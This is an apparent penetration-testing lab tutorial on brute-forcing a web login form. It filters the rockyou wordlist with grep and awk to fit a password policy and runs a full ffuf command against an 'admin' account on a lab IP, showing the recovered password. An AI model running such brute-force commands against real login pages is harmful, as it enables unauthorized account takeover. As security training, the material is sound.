# Brute-Forcing Passwords

## Overview

After identifying valid users, password-based authentication relies solely on the password for user verification. Since users typically choose easy-to-remember passwords, attackers can often guess or brute-force them.

While password brute-forcing is covered in detail in other modules, this section discusses an example of brute-forcing a password-based login form—one of the most common broken authentication scenarios.

## Password Vulnerabilities

Passwords remain a common authentication method but face several issues:

- **Password Reuse**: Users often use the same password across multiple accounts. If one account is compromised, all accounts become vulnerable.
- **Weak Passwords**: Passwords based on dictionary words, typical phrases, or simple patterns are susceptible to brute-force attacks.
- **Password Spraying**: Attackers use leaked password lists to try the same credentials across different web applications.

## Password Policy Requirements

The sample web application displays:
```
Password update notice due to security issue.
Requirements: one uppercase, one lowercase, one digit, minimum 10 characters.
```

## Wordlist Preparation

The success of a brute-force attack depends on the number of attempts and the time required. Only use passwords matching the target's password policy.

**Original wordlist (rockyou.txt):**
```bash
wc -l /opt/useful/seclists/Passwords/Leaked-Databases/rockyou.txt
# Output: 14344391 passwords
```

**Filtered wordlist (99% reduction):**

Using `grep`:
```bash
grep '[[:upper:]]' /opt/useful/seclists/Passwords/Leaked-Databases/rockyou.txt | \
grep '[[:lower:]]' | grep '[[:digit:]]' | grep -E '.{10}' > custom_wordlist.txt

wc -l custom_wordlist.txt
# Output: 151647 passwords
```

Or using `awk`:
```bash
awk 'length($0) >= 10 && /[a-z]/ && /[A-Z]/ && /[0-9]/' \
/opt/useful/seclists/Passwords/Leaked-Databases/rockyou.txt > custom_wordlist.txt
```

## Brute-Force Attack

**1. Identify the target user:** `admin` (confirmed as valid)

**2. Intercept the login request:**
```
POST /index.php
Content-Type: application/x-www-form-urlencoded

username=admin&password=[INPUT]
Response: "Invalid username or password."
```

**3. Execute the brute-force attack:**
```bash
ffuf -w ./custom_wordlist.txt \
    -u http://172.17.0.2/index.php \
    -X POST \
    -H "Content-Type: application/x-www-form-urlencoded" \
    -d "username=admin&password=FUZZ" \
    -fr "Invalid username"
```

**Result:**
```
[Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 4764ms]
    * FUZZ: Buttercup1
```

## Successful Login

After obtaining the password, log in at:
```
http://<SERVER_IP>:<PORT>/admin.php
```

Dashboard displays: 283,000 monthly visitors, 105 blog posts, 1,200 comments, 350 users.

## Further References

- **Cracking Passwords with Hashcat** module
- **Password Attacks** module
- **Login Brute Forcing** module
 